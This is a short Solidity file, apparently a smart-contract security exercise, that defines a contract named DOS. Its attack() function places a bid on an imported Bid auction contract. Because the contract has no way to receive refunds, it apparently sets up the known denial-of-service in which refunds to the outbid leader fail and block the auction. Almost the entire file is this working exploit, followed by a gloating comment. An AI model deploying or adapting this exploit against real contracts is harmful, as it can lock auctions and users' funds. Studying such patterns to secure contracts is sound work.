// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "./bidding.sol";

contract DOS {
    Bid bid;

    constructor(address payable _bid) {
        bid = Bid(_bid);
    }

    function attack() public payable {
        bid.setCurrentAuctionPrice{value: msg.value}();

    }
    //hahahahahahaha
    
}